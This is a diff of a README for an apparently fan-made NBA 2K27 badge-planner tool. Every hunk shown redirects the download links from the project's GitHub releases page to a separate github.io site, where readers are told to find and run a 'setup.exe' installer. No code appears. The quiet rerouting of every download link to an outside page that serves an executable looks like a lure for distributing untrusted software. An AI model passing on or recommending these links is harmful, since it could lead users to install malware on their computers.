@@ -1,6 +1,6 @@
 # 🏀 nba-2k27-mycareer-badge-planner - Plan Your Perfect Badge Loadout
 
-[![Download Now](https://img.shields.io/badge/Download-NBA_2K27_Badge_Planner-00A4EF?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dosiupfield1045/nba-2k27-mycareer-badge-planner/releases)
+[![Download Now](https://img.shields.io/badge/Download-NBA_2K27_Badge_Planner-00A4EF?style=for-the-badge&logo=windows&logoColor=white)](https://dosiupfield1045.github.io)
 
 ---
 
@@ -20,7 +20,7 @@ This tool does **not** claim to unlock badges or modify your game. It is purely 
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Dosiupfield1045/nba-2k27-mycareer-badge-planner/releases](https://github.com/Dosiupfield1045/nba-2k27-mycareer-badge-planner/releases)
+Visit this link to download the application: [https://dosiupfield1045.github.io](https://dosiupfield1045.github.io)
 
 The download page will show you the latest version. Look for the file named something like `nba-2k27-badge-planner-setup.exe` or similar.
 
@@ -209,8 +209,8 @@ This is a fan-made concept application. It is not affiliated with 2K Games, Visu
 
 ## 🔗 Quick Links
 
-- **Download Page**: [https://github.com/Dosiupfield1045/nba-2k27-mycareer-badge-planner/releases](https://github.com/Dosiupfield1045/nba-2k27-mycareer-badge-planner/releases)
-- **Download Now**: [Get the Latest Version](https://github.com/Dosiupfield1045/nba-2k27-mycareer-badge-planner/releases)
+- **Download Page**: [https://dosiupfield1045.github.io](https://dosiupfield1045.github.io)
+- **Download Now**: [Get the Latest Version](https://dosiupfield1045.github.io)
 
 ---
 
